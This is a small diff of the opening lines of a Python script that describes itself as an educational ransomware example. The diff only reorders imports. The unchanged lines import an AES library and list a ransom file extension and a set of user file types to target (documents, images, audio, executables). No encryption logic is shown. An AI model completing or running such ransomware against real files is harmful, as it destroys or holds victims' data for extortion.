@@ -1,11 +1,12 @@
 # This is an example of what ransomware would look like and how it behaves.
 # This was created for educational purposes, any external use is not the author's problem.
+
 import os
-from importlib.resources import path
-from pathlib import Path
 import glob
 import pyaes
 import tkinter as tk
+from importlib.resources import path
+from pathlib import Path
 
 Ext = ".Tidex"
 all_Ext = ["*.txt", "*.pdf", "*.exe", "*.xlsx", "*.docx", "*.xls", "*.xml", "*.cpp", "*.doc", "*.jpg", "*.png", "*.mp3"]
